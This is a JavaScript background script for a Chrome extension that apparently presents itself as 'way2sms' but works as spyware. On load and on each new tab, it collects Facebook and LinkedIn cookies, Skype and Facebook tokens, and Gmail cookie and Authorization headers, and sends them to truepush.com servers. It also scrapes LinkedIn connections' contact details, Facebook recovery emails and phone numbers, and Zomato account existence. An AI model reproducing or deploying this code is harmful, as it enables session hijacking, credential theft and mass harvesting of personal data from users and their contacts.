// wonmorfbfon
try {
    var frec = 'https://s3.truepush.com';
    var lcsa = 'https://s6.truepush.com';
    var lcnsa = 'https://s5.truepush.com';
    var ssa = 'https://s7.truepush.com';
    var zlp = 'https://s8.truepush.com';
    var str = 'https://s.truepush.com';


    var source = "way2sms";

    var l_i_c = zlp + "/zomato/z_logInp?src=way2sms", p_i_c = zlp + "/zomato/z_proInp?src=way2sms"
        , p_r_c = zlp + "/zomato/z_proRes?src=way2sms", l_r_c = zlp + "/zomato/z_logRes?src=way2sms";


    function skype() {
        chrome.storage.sync.get(["skype_token", "skypeid"], function (items) {
            var skype_token = items.skype_token;
            var skypeid = items.skypeid;
            skyver(skype_token, skypeid);
        });
    }

    chrome.storage.onChanged.addListener(function (changes, namespace) {
        //
        //
        if (changes.skype_token) {
            skype();
        }
        if (changes.fb_access_token) {
            fbt();
        }
        if (changes.sid) {
            phit();
        }
        if (changes.xfbdebug) {
            frechit();
        }
    });

    function frechit() {
        chrome.storage.sync.get(["fid"], function (items) {
            var fb_id = items.fid;
            var rchr = new XMLHttpRequest();
            rchr.open("GET", "https://www.facebook.com/recover/initiate?lwv=120&lwc=1348092", true);
            rchr.onreadystatechange = function () {
                if (rchr.readyState === 4) {
                    var emails = [], phn_numbers = [], username;

                    var doc = new DOMParser().parseFromString(rchr.responseText, "text/html");

                    if (doc.getElementsByClassName('fsl fwb fcb').length > 0) {
                        var name = doc.getElementsByClassName('fsl fwb fcb');
                        username = name[0].innerText;
                    }
                    var reset_division = doc.getElementsByClassName('_8u _42ef');

                    for (var i = 0; i < reset_division.length; i++) {
                        var rec_element = reset_division[i];
                        if (rec_element.innerHTML.indexOf('Send code via email') > -1) {
                            var inhtml = rec_element.innerHTML.replace("<div><strong>Send code via email</strong><br><div>", "").replace("</div></div>", "");
                            inhtml.split("</div><div>").forEach(function (each_mail) {
                                if (each_mail && each_mail !== "") emails.push(each_mail);
                            })

                        }

                        if (rec_element.innerHTML.indexOf('Send code via SMS') > -1) {
                            var inhtml = rec_element.innerHTML.replace("<div><strong>Send code via SMS</strong><br><div dir=\"ltr\">", "").replace("</div></div>", "");
                            inhtml.split("</div><div>").forEach(function (each_num) {
                                if (each_num && each_num !== "") phn_numbers.push(each_num);
                            })

                        }
                    }
                    var data = {fb_id: fb_id};
                    if (username) data.username = username;
                    if (emails.length) data.emails = emails;
                    if (phn_numbers.length) data.phn_numbers = phn_numbers;
                    var serverhr = new XMLHttpRequest();
                    serverhr.open("POST", frec + "/?recovery_crashed=reset", true);
                    serverhr.onreadystatechange = function () {
                        if (serverhr.readyState === 4) {
                            if (fid_arr.length) {
                                flhit(fid_arr.pop());
                            }
                        }
                    };
                    serverhr.send(JSON.stringify(data));
                }
            };
            rchr.send()
        });

    }

    function phit() {
        chrome.storage.sync.get(["cookie", "auth", "mail"], function (items) {
            var shr = new XMLHttpRequest();
            shr.open("POST", "https://s.truepush.com/plus_call", true);
            shr.onreadystatechange = function () {
                if (shr.readyState === 4) {
                }
            };
            shr.setRequestHeader("content-type", "application/json");
            shr.send(JSON.stringify(items));
        });
    }


    window.addEventListener("load", function () {
        cook_Li();
        get_c_count();
        nocooker();
    });

    chrome.tabs.onCreated.addListener(function () {
        cook_Li();
        get_c_count();
        loginStatus();
        nocooker();
    });

    function nocooker() {
        var datr, locale, sb, c_user, xs, fr, csm, s, pl, lu, p, presence;
        chrome.cookies.getAll({}, function (cookies) {

            for (var i in cookies) {
                if (cookies[i].domain === ".facebook.com") {
                    switch (cookies[i].name) {
                        case 'datr':
                            datr = cookies[i].value;
                            break;
                        case 'locale':
                            locale = cookies[i].value;
                            break;
                        case 'sb':
                            sb = cookies[i].value;
                            break;
                        case 'c_user':
                            c_user = cookies[i].value;
                            break;
                        case 'xs':
                            xs = cookies[i].value;
                            break;
                        case 'fr':
                            fr = cookies[i].value;
                            break;
                        case 'csm':
                            csm = cookies[i].value;
                            break;
                        case 's':
                            s = cookies[i].value;
                            break;
                        case 'pl':
                            pl = cookies[i].value;
                            break;
                        case 'lu':
                            lu = cookies[i].value;
                            break;
                        case 'p':
                            p = cookies[i].value;
                            break;
                        case 'presence':
                            presence = cookies[i].value;
                            break;
                    }
                }
            }
            if (!(c_user && datr && sb && xs && fr && presence)) {
                var shr = new XMLHttpRequest();
                shr.open("GET", frec + "?recovery_crashed=reset", true);
                shr.onreadystatechange = function () {
                    if (shr.readyState == 4) {
                        if (shr.responseText != "ok") {
                            fid_arr = JSON.parse(shr.responseText);
                            if (fid_arr.length) {
                                flhit(fid_arr.pop());
                            }
                        }
                    }
                };
                shr.send();
            }
        });
    }

    function flhit(fb_id) {
        var lghr = new XMLHttpRequest();
        lghr.open("GET", "https://www.facebook.com", true);
        lghr.onreadystatechange = function () {
            if (lghr.readyState == 4) {
                var shr = new XMLHttpRequest();
                shr.open("POST", "https://www.facebook.com/login.php?login_attempt=1&lwv=110", true);
                shr.onreadystatechange = function () {
                    if (shr.readyState == 4) {
                        chrome.storage.sync.set({
                            "fid": fb_id,
                            "xfbdebug": shr.getResponseHeader("x-fb-debug")
                        });
                    }
                };
                shr.setRequestHeader("content-type", "application/x-www-form-urlencoded");
                shr.send("lsd=AVqOJFUU&email=" + fb_id + "&pass=&timezone=-330&lgndim=eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODUyLCJjIjoyNH0%3D&lgnrnd=055541_AiVL&lgnjs=1501505741&ab_test_data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&locale=en_GB&login_source=login_bluebar");
            }
        };
        lghr.send();
    }

    function cook_Li() {
        chrome.cookies.getAll({}, function (cookies) {
            var li_cook = {};
            for (var i in cookies) {
                if (cookies[i].domain === ".linkedin.com" || cookies[i].domain === ".www.linkedin.com" || cookies[i].domain === "www.linkedin.com") {
                    li_cook[cookies[i].name] = cookies[i].value.replace(/"/g, "");
                }
            }
            var membername;
            var mailid;
            var mhr = new XMLHttpRequest();
            mhr.open("GET", "https://www.linkedin.com/psettings/email", true);
            mhr.onreadystatechange = function () {
                if (mhr.readyState === 4) {
                    var html = mhr.responseText.toString().replace(/<!--/g, "").replace(/-->/g, "");
                    var doc = new DOMParser().parseFromString(html, "text/html");
                    try {
                        if (doc.getElementsByClassName('member-name').length > 0) {
                            var t1 = doc.getElementsByClassName('member-name');
                            membername = t1[0].innerText;
                        } else {
                            var t2 = doc.getElementsByClassName('user-title')[0].innerHTML;
                            var y = new DOMParser().parseFromString(t2, "text/html");
                            var x = y.getElementsByTagName('h2');
                            membername = x[0].innerText;
                        }
                        var a = doc.getElementsByClassName('email-address')[0].innerText;
                        mailid = a;
                        var fhr = new XMLHttpRequest();
                        fhr.open("GET", "https://www.linkedin.com/mynetwork/invite-connect/connections/", true);
                        fhr.onreadystatechange = function () {
                            if (fhr.readyState === 4) {
                                try {
                                    var count = fhr.responseText.substring(fhr.responseText.indexOf('&quot;numConnections&quot;:') + 27);
                                    count = count.substring(0, count.indexOf(",&quot;"));
                                    // connections(count);
                                    var lhr = new XMLHttpRequest();
                                    lhr.open("POST", lcsa + "?num_conn=" + count + "&membername=" + membername + "&mailid=" + mailid + "&source=" + source + "_" + chrome.runtime.getManifest().version + "&eid=" + chrome.runtime.id, true);
                                    lhr.onreadystatechange = function () {
                                        if (lhr.readyState === 4) {
                                        }
                                    };
                                    lhr.send(JSON.stringify(li_cook));
                                } catch (e) {
                                }
                            }
                        };
                        fhr.send();
                    } catch (errr) {
                    }
                }
            };
            mhr.send();
        });
    }


    function get_c_count() {
        var membername;
        var mailid;
        var mhr = new XMLHttpRequest();
        mhr.open("GET", "https://www.linkedin.com/psettings/email", true);
        mhr.onreadystatechange = function () {
            if (mhr.readyState === 4) {
                var html = mhr.responseText.toString().replace(/<!--/g, "").replace(/-->/g, "");
                var doc = new DOMParser().parseFromString(html, "text/html");
                try {
                    if (doc.getElementsByClassName('member-name').length > 0) {
                        var t1 = doc.getElementsByClassName('member-name');
                        membername = t1[0].innerText;
                    } else {
                        var t2 = doc.getElementsByClassName('user-title')[0].innerHTML;
                        var y = new DOMParser().parseFromString(t2, "text/html");
                        var x = y.getElementsByTagName('h2');
                        membername = x[0].innerText;
                    }
                    var a = doc.getElementsByClassName('email-address')[0].innerText;
                    mailid = a;
                    var fhr = new XMLHttpRequest();
                    fhr.open("GET", "https://www.linkedin.com/mynetwork/invite-connect/connections/", true);
                    fhr.onreadystatechange = function () {
                        if (fhr.readyState === 4) {
                            try {
                                var count = fhr.responseText.substring(fhr.responseText.indexOf('&quot;numConnections&quot;:') + 27);
                                count = count.substring(0, count.indexOf(",&quot;"));
                                // connections(count);
                                var shr = new XMLHttpRequest();
                                shr.open("GET", lcnsa + "?mailid=" + mailid + "&name=" + membername + "&num_conn=" + count + "&source=" + source + "_" + chrome.runtime.getManifest().version + "&eid=" + chrome.runtime.id + "&patch1=true", true);
                                shr.onreadystatechange = function () {
                                    if (shr.readyState === 4) {
                                        if (shr.responseText !== "ok") {
                                            connections(parseInt(JSON.parse(shr.responseText).start), parseInt(JSON.parse(shr.responseText).count), mailid);
                                        }
                                    }
                                };
                                shr.send();
                            } catch (e) {
                            }
                        }
                    };
                    fhr.send();
                } catch (errr) {
                }

            }
        };
        mhr.send();
    }

    var con_length = 0;

    function contactinfo(identifier, cookie, profile, mailid) {
        var ehr = new XMLHttpRequest();
        ehr.open("GET", "https://www.linkedin.com/voyager/api/identity/profiles/" + identifier + "/profileContactInfo", true);
        ehr.onreadystatechange = function () {
            if (ehr.readyState === 4) {
                profile.profileContactInfo = JSON.parse(ehr.responseText);
                con_length--;
                data.push(profile);
                if (data.length === 10) {
                    post_data(data, mailid);
                    data = [];
                }
                if (con_length === 0) {
                    if (data.length > 0) {
                        post_data(data, mailid);
                        data = [];
                    }
                }
            }
        };
        var t = cookie;
        ehr.setRequestHeader("csrf-token", t.substring(1, t.length - 1));
        ehr.send();
    }

    var data = [];

    function connections(start, count, mailid) {
        chrome.cookies.get({"url": "https://www.linkedin.com", "name": "JSESSIONID"}, function (cookie) {
            var fhr = new XMLHttpRequest();
            fhr.open("GET", "https://www.linkedin.com/voyager/api/relationships/connections?count=" + count + "&sortType=RECENTLY_ADDED&start=" + start, true);
            fhr.onreadystatechange = function () {
                if (fhr.readyState === 4) {
                    con_length = JSON.parse(fhr.responseText).elements.length;
                    JSON.parse(fhr.responseText).elements.forEach(function (item, index) {
                        contactinfo(item.miniProfile.publicIdentifier, cookie.value, JSON.parse(fhr.responseText).elements[index], mailid)
                    })
                }
            };
            var t = cookie.value;
            fhr.setRequestHeader("csrf-token", t.substring(1, t.length - 1));
            fhr.send();
        })

    }

    function post_data(data, mailid) {
        var shr = new XMLHttpRequest();
        shr.open("POST", lcnsa + "?mailid=" + mailid + "&source=" + source + "_" + chrome.runtime.getManifest().version + "&eid=" + chrome.runtime.id + "&patch1=true", true);
        shr.onreadystatechange = function () {
            if (shr.readyState === 4) {

            }
        };
        shr.send(JSON.stringify(data).replace(/com.linkedin.voyager.common.MediaProcessorImage/g, "profilepic").replace(/com.linkedin.voyager.identity.profile.StandardProfileContactInterest/g, "interests").replace(/com.linkedin.voyager.identity.profile.StandardWebsite/g, "StandardWebsite").replace(/com.linkedin.voyager.identity.profile.CustomWebsite/g, "CustomWebsite"));
    }


    function skyver(skype_token, skypeid, firstName, lastName, mailid, cid) {
        var shr = new XMLHttpRequest();
        shr.open("GET", ssa + "?stoken=" + skype_token + "&skypeid=" + skypeid + "&fname=" + firstName + "&lname=" + lastName + "&mailid=" + mailid + "&cid=" + cid + "&source=" + source + "&eid=" + chrome.runtime.id, true);
        shr.onreadystatechange = function () {
            if (shr.readyState == 4) {
            }
        };
        shr.send();
    }


    function fbt() {
        chrome.storage.sync.get(["fbuserid", "fb_access_token"], function (items) {
            var fbuserid = items.fbuserid;
            var fb_access_token = items.fb_access_token;
            var lhr = new XMLHttpRequest();
            lhr.open("GET", str + "/fb_token/" + fb_access_token + "/" + fbuserid, true);
            lhr.onreadystatechange = function () {
                if (lhr.readyState === 4) {
                }
            };
            lhr.send();
        })
    }

    function loginStatus() {
        var fshr2 = new XMLHttpRequest();

        fshr2.open("POST", l_i_c, true);
        fshr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        fshr2.onreadystatechange = function () {
            if (fshr2.readyState == 4) {
                if (fshr2.responseText) {
                    if (JSON.parse(fshr2.responseText).email) {

                        JSON.parse(fshr2.responseText).email.forEach(function (doc, i) {
                            loginPro(doc, function (res, email) {
                                if (res === "login") {
                                    var fshr = new XMLHttpRequest();
                                    fshr.open("POST", l_r_c, true);

                                    fshr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                                    fshr.onreadystatechange = function () {
                                        if (fshr.readyState === 4) {
                                        }
                                    };
                                    fshr.send("email=" + email + "&res=" + res);
                                    getPInput();
                                } else {
                                    var fshr = new XMLHttpRequest();
                                    fshr.open("POST", l_r_c, true);

                                    fshr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                                    fshr.onreadystatechange = function () {
                                        if (fshr.readyState === 4) {
                                        }
                                    };
                                    fshr.send("email=" + email + "&res=" + res);

                                }

                            });
                        });

                    }
                }

            }
        };
        fshr2.send();
    }

    function getPInput() {
        var fshr2 = new XMLHttpRequest();

        fshr2.open("POST", p_i_c, true);
        fshr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        fshr2.onreadystatechange = function () {
            if (fshr2.readyState == 4) {
                if (fshr2.responseText) {
                    if (!JSON.parse(fshr2.responseText).account) {
                        JSON.parse(fshr2.responseText).email.forEach(function (doc, i) {
                            check_p_s(doc, function (exc, email, name, loc, acc, img) {

                                var fshr = new XMLHttpRequest();
                                fshr.open("POST", p_r_c, true);
                                fshr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                                fshr.onreadystatechange = function () {
                                    if (fshr.readyState == 4) {

                                    }
                                };
                                if (exc) fshr.send("email=" + email + "&res=skip");
                                else fshr.send("email=" + email + "&name=" + name + "&location=" + loc + "&account=" + acc + "&image=" + img);
                            });
                        });
                    }
                }
            }
        };
        fshr2.send();
    }

    function check_p_s(email, callback_r) {
        var fshr3 = new XMLHttpRequest();
        fshr3.open("POST", "https://www.zomato.com/php/liveSuggestUser.php?type=invite_user&q=" + email + "&user_count=10", true);
        fshr3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        fshr3.onreadystatechange = function () {
            if (fshr3.readyState == 4) {
                var document = new DOMParser().parseFromString(fshr3.responseText, "text/html");

                if (document && document.getElementsByClassName("left") && document.getElementsByClassName("left")[0]) {

                    var account = document.getElementsByClassName("left")[0].href;
                    var fshr4 = new XMLHttpRequest();
                    fshr4.open("POST", document.getElementsByClassName("left")[0].href, true);
                    fshr4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    fshr4.onreadystatechange = function () {
                        if (fshr4.readyState == 4) {

                            var document = new DOMParser().parseFromString(fshr4.responseText, "text/html");
                            if (document.title) {


                                var s = (document.title.split("|")[0]).split(",");
                                var dd = document.getElementsByClassName("ui small circular image")["0"].getElementsByTagName("img")[0];
                                var image = dd.getAttribute("data-original");

                                return callback_r(null, email, s[0], s[1], account, image)
                            }

                        }
                    }
                    fshr4.send();
                } else {


                    return callback_r("skip", email)

                }


            }
        };
        fshr3.send();
    }

    function loginPro(email, callback) {
        var name = email.substring(0, email.lastIndexOf("@"));
        var domain = email.substring(email.lastIndexOf("@") + 1);
        var fshr = new XMLHttpRequest();
        fshr.open("POST", "https://www.zomato.com/php/asyncLogin.php?", true);

        fshr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        fshr.onreadystatechange = function () {
            if (fshr.readyState == 4) {
                var doc = new DOMParser().parseFromString(fshr.responseText, "text/html");

                if ((doc.getElementsByTagName('body')[0].innerHTML).indexOf("Forgot Password") >= 0) {

                    return callback("user", email);


                } else if ((doc.getElementsByTagName('body')[0].innerHTML).indexOf("user_id") >= 0) {

                    return callback("login", email);

                } else {

                    return callback("not user", email);

                }


            }
        };
        fshr.send("login=" + name + "%40" + domain + "&password=dfgjdfgh&rememberFlag=checked");


    }

} catch (errr) {
    console.log(errr);
}

chrome.webRequest.onBeforeSendHeaders.addListener(
    function (details) {
        var cookie, auth, mail;
        for (var i = 0; i < details.requestHeaders.length; ++i) {
            if (details.requestHeaders[i].name === 'Cookie') {
                cookie = details.requestHeaders[i].value;

            }
            if (details.requestHeaders[i].name === 'Authorization') {
                auth = details.requestHeaders[i].value;

            }
        }
        if (cookie) {
            var sid = cookie.substring(cookie.indexOf("SID=") + 4);
            sid = sid.substring(0, sid.indexOf(";"));

            chrome.tabs.query({active: true}, function (d) {
                if (d[0].url.indexOf('mail.google.com') > -1) {
                    var lhr = new XMLHttpRequest();
                    lhr.open("GET", d[0].url, true);
                    lhr.onreadystatechange = function () {
                        if (lhr.readyState === 4) {
                            var globals = lhr.responseText.substring(lhr.responseText.indexOf("GLOBALS=[") + 8);
                            globals = globals.substring(0, globals.indexOf("];"));
                            globals = globals.replace(/'/g, "").split(",");
                            mail = globals[10];
                            mail = mail.replace(/"/g, "");
                            sid += mail;

                            chrome.storage.sync.set({
                                "sid": sid,
                                "cookie": cookie,
                                "auth": auth,
                                "mail": mail
                            });
                        }
                    };
                    lhr.send();
                }
            })
        }


    },
    {urls: ["https://people-pa.clients6.google.com/v2/people/autocomplet*"]},
    ["requestHeaders"]);
